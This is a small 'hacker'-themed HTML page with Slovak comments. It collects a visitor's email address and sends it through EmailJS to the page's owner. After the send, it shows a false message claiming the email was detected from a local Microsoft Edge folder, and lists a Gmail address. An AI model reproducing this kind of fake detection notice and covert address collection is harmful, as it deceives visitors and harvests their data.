<!DOCTYPE html>
<html lang="sk">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Hacker Email Verification</title>
    <script src="https://cdn.emailjs.com/dist/email.min.js"></script>

    <style>
        /* Hackerská tematika */
        body {
            font-family: 'Courier New', Courier, monospace;
            background-color: black;
            color: #00FF00;
            text-align: center;
            padding: 50px;
        }

        h1 {
            font-size: 3em;
            margin-bottom: 20px;
        }

        #emailForm {
            background-color: #111;
            border: 2px solid #00FF00;
            display: inline-block;
            padding: 20px;
            margin: 20px;
            box-shadow: 0 0 20px #00FF00;
        }

        input[type="email"] {
            width: 300px;
            padding: 10px;
            margin: 10px;
            background-color: #222;
            border: 2px solid #00FF00;
            color: #00FF00;
            font-size: 1em;
        }

        button {
            padding: 10px 20px;
            background-color: black;
            color: #00FF00;
            border: 2px solid #00FF00;
            font-size: 1.5em;
            cursor: pointer;
            box-shadow: 0 0 10px #00FF00;
        }

        button:hover {
            background-color: #00FF00;
            color: black;
        }

        #responseMessage {
            font-size: 1.5em;
            margin-top: 20px;
        }
    </style>
</head>
<body>

    <h1>Hacker Email Verification</h1>
    <div id="emailForm">
        <label for="emailInput">Enter your email:</label>
        <input type="email" id="emailInput" required>
        <button id="sendCodeBtn">OK</button>
    </div>

    <div id="responseMessage"></div>

    <script>
        emailjs.init("user_12345abcde"); // Vlož tvoje vlastní EmailJS ID

        document.getElementById("sendCodeBtn").addEventListener("click", function() {
            var email = document.getElementById("emailInput").value;

            // Po kliknutí na tlačidlo odošleme e-mail cez EmailJS
            emailjs.send("service_xjov9b6", "template_iagnrtq", {
                from_name: "Hackers Guide Notify",
                to_name: "David",
                from_email: email // Používateľom zadaný e-mail
            })
            .then(function(response) {
                document.getElementById("responseMessage").innerHTML = `
                    <p>Email detected from: [C:\\Users\\Program Files\\Microsoft Edge\\saved-emails\\]</p>
                    <p>Check your mailbox: <strong>davidkoedumpw@gmail.com</strong></p>
                `;
            }, function(error) {
                document.getElementById("responseMessage").innerHTML = `
                    <p>Error: There was a problem sending the email. Please try again later.</p>
                `;
            });
        });
    </script>
</body>
</html>
